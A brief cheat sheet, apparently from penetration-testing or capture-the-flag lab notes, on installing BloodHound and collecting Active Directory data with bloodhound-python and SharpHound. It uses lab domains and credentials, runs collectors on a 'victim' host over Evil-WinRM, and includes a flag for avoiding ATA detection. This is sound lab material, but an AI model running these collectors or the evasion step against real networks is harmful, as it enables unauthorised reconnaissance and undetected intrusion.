# # `Download/Install` -

[BloodHound](https://github.com/BloodHoundAD/BloodHound)

Clone the repository into `/opt`, and also got the latest release binary. I’ll start `neo4j` (`apt install neo4j`) if it’s not already installed) with `neo4j start`, and then run Bloodhound. If you’re running as root, you’ll need the `--no-sandbox` flag.

If it’s a fresh install (or if you forget your password from a previous install, you can delete `/usr/share/neo4j/data/dbms/auth` and then it’s like a fresh install), I’ll need to change the `neo4j` password by running `neo4j console`, visiting the url it returns, and logging in with the default creds, neo4j/neo4j. It’ll force a password change them at that point. Now the BloodHound program can connect

[neo4jconsole && bloodhound for GUI]

## # `BloodHound(From Linux)` -

With creds you can run [bloodhound.py](https://github.com/fox-it/BloodHound.py) against the domain -

```bash
bloodhound-python -u hope.sharp -p IsolationIsKey? -d search.htb -c All -ns 10.10.11.129 --zip
```

```bash
bloodhound-python -d rebound.htb -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
```

Using Kerberos -

```bash
bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb -c ALL --zip
```

## # `Bloodhound(From Windows)` -

Download `SharpHound.exe` from [here](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) and upload it to the victim window machine

```powershell
*Evil-WinRM* PS C:\programdata> .\sharphound.exe -c all
```

Or Download `Sharphound.ps1` from [here](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1) 

```powershell
*Evil-WinRM* PS C:\programdata> . .\SharpHound.ps1
*Evil-WinRM* PS C:\programdata> Invoke-BloodHound -CollectionMethod All
```

To avoid detections like ATA :

```powershell
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```

